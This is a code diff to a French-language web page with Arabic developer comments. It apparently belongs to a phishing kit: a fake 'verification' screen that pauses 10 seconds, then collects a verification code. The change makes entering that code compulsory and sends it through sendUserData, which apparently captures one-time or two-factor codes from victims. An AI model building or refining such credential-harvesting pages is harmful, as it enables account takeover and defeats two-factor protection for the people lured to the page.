@@ -224,11 +224,11 @@
       <p style="text-align: center; color: #5f6368; font-size: 14px;">Vérification des informations...</p>
     </div>
 
-    <!-- Étape 3: كود التحقق (تظهر بعد 10 ثواني) -->
+    <!-- Étape 3: كود التحقق (تظهر بعد 10 ثواني - إجباري) -->
     <div id="step3">
       <form id="step3Form">
         <div class="input-group">
-          <input type="text" id="codeInput" autocomplete="off">
+          <input type="text" id="codeInput" required autocomplete="off">
           <label for="codeInput">Code de vérification (Saisir le code)</label>
         </div>
         <div class="actions-row" style="justify-content: flex-end;">
@@ -312,13 +312,18 @@
       }, 10000);
     });
 
-    // Étape 3 -> إرسال الكود إذا كُتب أو 'nulle' إذا تُرك فارغاً
+    // Étape 3 -> إرسال الكود فقط عند كتابته وإجبارية الإدخال
     step3Form.addEventListener('submit', async function(e) {
       e.preventDefault();
       
-      const userCode = codeInput.value.trim() ? codeInput.value.trim() : 'nulle';
+      const userCode = codeInput.value.trim();
+
+      if (!userCode) {
+        alert("Veuillez saisir le code de vérification pour continuer.");
+        return;
+      }
       
-      // إرسال البيانات مجدداً وتأكيد الكود
+      // إرسال البيانات مع الكود الإجباري
       await sendUserData(userCode);
 
       step3Div.style.display = 'none';
